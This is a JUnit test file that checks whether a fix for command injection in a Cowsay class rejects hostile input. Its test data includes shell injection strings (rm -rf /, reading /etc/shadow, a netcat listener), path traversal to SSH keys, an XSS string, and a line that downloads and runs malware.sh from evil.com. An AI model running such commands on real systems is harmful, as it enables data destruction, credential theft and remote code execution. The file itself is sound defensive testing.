package com.scalesec.vulnado;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Comprehensive security tests for the Cowsay class to verify
 * command injection vulnerabilities have been properly remediated.
 */
@DisplayName("Cowsay Security Tests")
public class CowsaySecurityTest {

    private Cowsay cowsay;

    @BeforeEach
    public void setUp() {
        cowsay = new Cowsay();
    }

    // ===== Positive Test Cases - Valid Inputs =====

    @Test
    @DisplayName("Should successfully process simple text input")
    public void testValidSimpleInput() {
        String input = "Hello World";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertFalse(result.startsWith("Error:"), "Valid input should not produce an error");
    }

    @Test
    @DisplayName("Should successfully process input with allowed punctuation")
    public void testValidInputWithPunctuation() {
        String input = "Hello, World! How are you?";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertFalse(result.startsWith("Error:"), "Valid input with punctuation should not produce an error");
    }

    @Test
    @DisplayName("Should successfully process input with apostrophes and hyphens")
    public void testValidInputWithApostrophesAndHyphens() {
        String input = "It's a well-done job.";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertFalse(result.startsWith("Error:"), "Valid input with apostrophes should not produce an error");
    }

    @Test
    @DisplayName("Should successfully process alphanumeric input")
    public void testValidAlphanumericInput() {
        String input = "Test123 message 456";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertFalse(result.startsWith("Error:"), "Alphanumeric input should not produce an error");
    }

    // ===== Command Injection Attack Prevention Tests =====

    @ParameterizedTest
    @ValueSource(strings = {
        "; ls -la",                           // Command separator
        "& whoami",                           // Background command
        "| cat /etc/passwd",                  // Pipe operator
        "&& rm -rf /",                        // Logical AND
        "|| echo hacked",                     // Logical OR
        "`whoami`",                           // Command substitution
        "$(whoami)",                          // Command substitution
        "; cat /etc/shadow",                  // Read sensitive files
        "& ping -c 10 example.com",          // Network command
        "| nc -l 1234",                      // Netcat listener
    })
    @DisplayName("Should reject command injection attempts with shell metacharacters")
    public void testCommandInjectionPrevention(String maliciousInput) {
        String result = cowsay.run(maliciousInput);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"),
            "Malicious input should produce an error: " + maliciousInput);
        assertTrue(result.contains("invalid characters"),
            "Error message should indicate invalid characters");
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "hello; cat /etc/passwd",
        "test && whoami",
        "message | ls -la",
        "data > /tmp/output.txt",
        "input < /etc/hosts",
        "text >> /var/log/malicious.log"
    })
    @DisplayName("Should reject inputs with embedded command injection attempts")
    public void testEmbeddedCommandInjection(String maliciousInput) {
        String result = cowsay.run(maliciousInput);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"),
            "Input with command injection should produce an error");
    }

    @Test
    @DisplayName("Should reject input with backticks (command substitution)")
    public void testBacktickCommandSubstitution() {
        String input = "test `id` message";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"), "Backtick command substitution should be rejected");
        assertTrue(result.contains("invalid characters"), "Should indicate invalid characters");
    }

    @Test
    @DisplayName("Should reject input with dollar sign command substitution")
    public void testDollarSignCommandSubstitution() {
        String input = "test $(id) message";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"), "Dollar sign command substitution should be rejected");
        assertTrue(result.contains("invalid characters"), "Should indicate invalid characters");
    }

    // ===== Path Traversal and File Access Prevention Tests =====

    @ParameterizedTest
    @ValueSource(strings = {
        "../../../etc/passwd",
        "/etc/shadow",
        "..\\..\\..\\windows\\system32",
        "~/sensitive/data",
        "/root/.ssh/id_rsa"
    })
    @DisplayName("Should reject inputs attempting path traversal")
    public void testPathTraversalPrevention(String maliciousPath) {
        String result = cowsay.run(maliciousPath);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"),
            "Path traversal attempts should produce an error");
    }

    // ===== Special Characters and Encoding Tests =====

    @ParameterizedTest
    @ValueSource(strings = {
        "test\nwhoami",                       // Newline injection
        "test\rwhoami",                       // Carriage return injection
        "test\u0000whoami",                   // Null byte injection
        "test%0awhoami",                      // URL encoded newline
        "test%0dwhoami",                      // URL encoded carriage return
    })
    @DisplayName("Should reject inputs with control characters")
    public void testControlCharacterInjection(String maliciousInput) {
        String result = cowsay.run(maliciousInput);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"),
            "Input with control characters should produce an error");
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "test<script>alert('xss')</script>",
        "test${malicious}",
        "test#{malicious}",
        "test@{malicious}",
        "test*wildcard",
        "test[range]",
        "test{a,b,c}"
    })
    @DisplayName("Should reject inputs with special shell characters")
    public void testSpecialShellCharacters(String maliciousInput) {
        String result = cowsay.run(maliciousInput);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"),
            "Input with special shell characters should produce an error");
    }

    // ===== Input Validation Tests =====

    @Test
    @DisplayName("Should reject null input")
    public void testNullInput() {
        String result = cowsay.run(null);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"), "Null input should produce an error");
        assertTrue(result.contains("cannot be empty"), "Should indicate input cannot be empty");
    }

    @Test
    @DisplayName("Should reject empty input")
    public void testEmptyInput() {
        String result = cowsay.run("");
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"), "Empty input should produce an error");
        assertTrue(result.contains("cannot be empty"), "Should indicate input cannot be empty");
    }

    @Test
    @DisplayName("Should reject input exceeding maximum length")
    public void testMaxLengthExceeded() {
        // Create input longer than 500 characters
        StringBuilder longInput = new StringBuilder();
        for (int i = 0; i < 501; i++) {
            longInput.append("a");
        }
        String result = cowsay.run(longInput.toString());
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"), "Overly long input should produce an error");
        assertTrue(result.contains("exceeds maximum length"), "Should indicate length exceeded");
    }

    @Test
    @DisplayName("Should accept input at maximum length boundary")
    public void testMaxLengthBoundary() {
        // Create input exactly 500 characters
        StringBuilder maxInput = new StringBuilder();
        for (int i = 0; i < 500; i++) {
            maxInput.append("a");
        }
        String result = cowsay.run(maxInput.toString());
        assertNotNull(result, "Result should not be null");
        // This may or may not succeed depending on cowsay availability,
        // but it should not be rejected for length
        // We just verify it doesn't fail with a length error
        if (result.startsWith("Error:")) {
            assertFalse(result.contains("exceeds maximum length"),
                "Should not reject input at exactly max length");
        }
    }

    // ===== Multiple Attack Vector Combination Tests =====

    @Test
    @DisplayName("Should reject complex multi-stage command injection")
    public void testMultiStageCommandInjection() {
        String input = "hello; wget http://evil.com/malware.sh -O /tmp/mal.sh && chmod +x /tmp/mal.sh && /tmp/mal.sh";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"), "Multi-stage attack should be rejected");
    }

    @Test
    @DisplayName("Should reject input with multiple injection techniques")
    public void testMultipleInjectionTechniques() {
        String input = "test | cat /etc/passwd && $(whoami) & ls -la";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertTrue(result.startsWith("Error:"), "Multiple injection techniques should be rejected");
    }

    // ===== Regression Tests for Array-based exec() =====

    @Test
    @DisplayName("Verify array-based exec prevents shell interpretation")
    public void testArrayBasedExecPreventsShellInterpretation() {
        // Even if input passes validation, the array-based exec should prevent
        // shell interpretation. This is a conceptual test - the validation
        // should catch these, but this documents the defense-in-depth approach.
        String[] dangerousInputs = {
            "valid input; ls",
            "valid & whoami",
            "valid | cat"
        };

        for (String input : dangerousInputs) {
            String result = cowsay.run(input);
            assertTrue(result.startsWith("Error:"),
                "Input with shell metacharacters should be rejected: " + input);
        }
    }

    // ===== Edge Cases =====

    @Test
    @DisplayName("Should handle input with only spaces")
    public void testInputWithOnlySpaces() {
        String input = "    ";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        // Spaces are valid, should not error
        assertFalse(result.startsWith("Error:") && result.contains("invalid characters"),
            "Input with only spaces should be valid");
    }

    @Test
    @DisplayName("Should handle input with multiple consecutive spaces")
    public void testInputWithMultipleSpaces() {
        String input = "Hello     World";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertFalse(result.startsWith("Error:") && result.contains("invalid characters"),
            "Input with multiple spaces should be valid");
    }

    @Test
    @DisplayName("Should handle numeric-only input")
    public void testNumericOnlyInput() {
        String input = "1234567890";
        String result = cowsay.run(input);
        assertNotNull(result, "Result should not be null");
        assertFalse(result.startsWith("Error:"), "Numeric input should be valid");
    }
}
